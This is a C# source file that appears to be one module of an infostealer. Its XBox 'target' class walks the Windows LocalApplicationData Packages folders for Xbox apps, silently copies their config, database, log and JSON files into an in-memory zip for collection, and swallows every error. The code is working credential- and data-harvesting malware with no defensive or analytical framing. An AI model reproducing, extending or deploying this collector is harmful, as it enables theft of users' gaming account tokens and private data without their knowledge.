using Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Targets.Games
{
	public class XBox : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages");
	    if (!Directory.Exists(path1))
	      return;
	    string[] directories = Directory.GetDirectories(path1, "Microsoft.Xbox*", SearchOption.TopDirectoryOnly);
	    if (directories == null || directories.Length == 0)
	      return;
	    string[] source = new string[9]
	    {
	      ".ini",
	      ".cfg",
	      ".json",
	      ".xml",
	      ".log",
	      ".dat",
	      ".db",
	      ".yaml",
	      ".txt"
	    };
	    foreach (string path2 in directories)
	    {
	      Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	      counterApplications.Name = "Xbox";
	      foreach (string file in Directory.GetFiles(path2, "*.*", SearchOption.AllDirectories))
	      {
	        try
	        {
	          FileInfo fileInfo = new FileInfo(file);
	          if (fileInfo.Length < 10000000L)
	          {
	            if (((IEnumerable<string>) source).Contains<string>(fileInfo.Extension.ToLower()))
	            {
	              string path3 = file.Substring(path2.Length).TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
	              string entryPath = Path.Combine("Xbox", Path.GetFileName(path2), path3).Replace('\\', '/');
	              zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
	              counterApplications.Files.Add($"{fileInfo.FullName} => {entryPath}");
	            }
	          }
	        }
	        catch
	        {
	        }
	      }
	      if (counterApplications.Files.Count > 0)
	      {
	        counterApplications.Files.Add("Xbox\\");
	        counter.Games.Add(counterApplications);
	      }
	    }
	  }
	}
}
